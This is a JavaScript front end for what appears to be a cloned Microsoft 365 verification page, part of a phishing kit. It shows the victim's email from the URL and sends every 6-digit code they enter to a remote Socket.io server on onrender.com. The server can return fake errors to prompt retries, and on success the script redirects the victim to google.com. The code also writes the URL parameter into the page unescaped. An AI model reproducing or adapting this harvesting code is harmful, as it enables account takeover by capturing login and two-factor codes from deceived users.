let connected = null;
let server = null;
const useLocal = true;

window.addEventListener('load', async function () {
	// Connect to the Socket.io server
	if ((window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') && useLocal) {
		server = 'http://localhost:3023';
	} else {
		server = 'https://three65-clone-socket-server.onrender.com';
	}
	const socket = io(server);

	const urlParams = new URLSearchParams(window.location.search);
	const myParam = urlParams.get('user');

	const code_input = document.querySelector('#code-input');
	const error_msg = document.querySelector('#error-msg');
	const codeForm = document.querySelector('#code-form');
	const thisUser = document.querySelector('#user-email');
	const overlay = document.querySelector('#overlay');

	codeForm.addEventListener('submit', checkCode);

	if (myParam != null) {
		thisUser.innerHTML = myParam;
		thisUser.classList.toggle('hidden');
	}

	var code_error_shown = false;

	async function checkCode(e) {
		e.preventDefault();
		if (code_input.value.length < 1) {
			code_error('Enter the code to help us verify your identity.', true);
			code_error_shown = true;
			return;
		}

		if (code_input.value.length < 6) {
			code_error('Please enter the 6-digit code. The code only contains numbers.', true);
			code_error_shown = true;
			return;
		}

		socket.emit('entered-code', code_input.value);
		overlay.classList.toggle('hidden');
	}

	code_input.addEventListener('input', () => {
		if (code_error_shown) {
			if (code_input.value.length > 5) {
				code_error('', false);
			}
		}
	});

	const code_error = (msg, type, element = code_input, err_el = error_msg) => {
		if (type == true) {
			err_el.innerHTML = msg;
			err_el.classList.remove('hidden');
			element.classList.remove('border-gray-600');
			element.classList.add('border-red-500');
			return;
		}

		err_el.classList.add('hidden');
		element.classList.remove('border-red-500');
		element.classList.add('border-gray-600');
	};

	socket.on('connect', async () => {
		socket.emit('client-connected', true);
		console.log('connected');
	});

	socket.on('send-code-error', async (res) => {
		console.log('code data received', res);
		overlay.classList.toggle('hidden');

		if (res != 'login') {
			code_error(res, true, code_input, error_msg);
			code_error_shown = true;
			return;
		} else {
			window.location.href = 'https://google.com';
		}
	});
});
